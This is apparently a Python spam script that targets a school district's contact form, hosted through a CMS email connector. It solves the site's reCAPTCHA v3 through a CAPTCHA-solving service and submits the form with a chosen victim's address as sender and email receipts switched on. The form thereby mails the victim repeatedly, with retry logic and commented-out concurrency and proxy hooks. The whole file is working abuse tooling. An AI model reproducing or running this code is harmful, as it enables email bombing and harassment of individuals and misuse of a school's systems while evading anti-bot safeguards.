import uuid
from datetime import datetime
from os.path import basename

import requests

import module
from module import Spam


def get_password(s, password, timestamp):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'AjaxAuthToken': '70f906cfaa4b4e96b7def8e2927ab8bc',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://shs.rbhsd.org',
        'Referer': 'https://shs.rbhsd.org/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'timestamp': timestamp,
    }

    json_data = {
        'Password': password,
    }

    response = s.put('https://email.catapultcms.com/Connector/EmailPassword', params=params, headers=headers,
                     json=json_data)
    return response


def post(s, password, timestamp, captcha, target, text):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'AjaxAuthToken': '70f906cfaa4b4e96b7def8e2927ab8bc',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json; charset=UTF-8',
        'Origin': 'https://shs.rbhsd.org',
        'Referer': 'https://shs.rbhsd.org/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'timestamp': timestamp,
    }

    json_data = {
        'Id': -1,
        'ToEmail': 'support@rbhsd.org',
        'ToName': 'Contact',
        'Url': 'https://shs.rbhsd.org/Contact-Us/index.html',
        'FromEmail': target,
        'FromName': 'text',
        'EmailReceipt': True,
        'Subject': 'text',
        'Message': 'text',
        'Password': '{"Password":"%s","Token":"%s":"%s"}' % (password, captcha, str(uuid.uuid4()).replace('-', '')),
    }

    response = s.put('https://email.catapultcms.com/Connector/Email', params=params, headers=headers,
                     json=json_data)
    return response


googlekey = '6Ldnn3skAAAAAIOP5uc0mx97rYGRuRUgtJK3l33E'
pageurl = 'https://shs.rbhsd.org/Contact-Us/index.html'


class ConcreteSpam(Spam):
    attempts = 30

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        # s.proxies = self.get_proxies()
        cap = self.solve_captcha(pageurl=pageurl, googlekey=googlekey, version='v3')
        if not cap:
            return
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        password = module.generate_text(32)
        get_password(s, password, timestamp)
        post_resp = post(s, password, timestamp, cap, target, 'test request')
        print(post_resp.text)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Email Sent')
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently(120)


if __name__ == '__main__':
    main()
